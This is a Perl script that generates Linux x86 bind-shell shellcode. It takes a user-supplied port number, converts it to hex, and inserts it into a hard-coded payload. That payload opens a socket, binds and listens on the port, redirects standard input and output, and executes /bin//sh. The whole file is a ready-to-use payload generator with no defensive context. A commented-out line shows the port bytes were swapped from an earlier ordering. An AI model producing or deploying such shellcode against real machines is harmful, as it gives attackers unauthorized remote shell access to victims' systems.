#!/usr/bin/perl

use strict;
use warnings;

my $port = $ARGV[0];

if ($port > 65535) {
	print "Port Greater Than 65535.  Port Range: 1 - 65535 \n";
	exit;
}
if ($port < 1) {
	print "Port Less Than 1.  Port Range: 1 - 65535 \n";
	exit;
}
if (length($port) < 4) {
	print "Ports Only Above 1000 - Requires Root to Bind\n";
	exit;
}

my $hexport =  sprintf("%04X", $port);
print "\nPort Number $port in Hex: $hexport\n\n";

# Orginal
#my $first_set = substr( $hexport, 0, 2 );
#my $second_set = substr( $hexport, 2, 4);

my $first_set = substr( $hexport, 2, 4 );
my $second_set = substr( $hexport, 0, 2);

my $shellcode_port =  '\x' . "$first_set" . '\x' . "$second_set";
print "\nPort Number to ShellCode Format: $shellcode_port\n";

my $sc = '\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68' . $shellcode_port . '\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80';
print "\n$sc\n"; 

print "\nShellcode has been generated.\n";
print "\nProgram Exiting.\n";






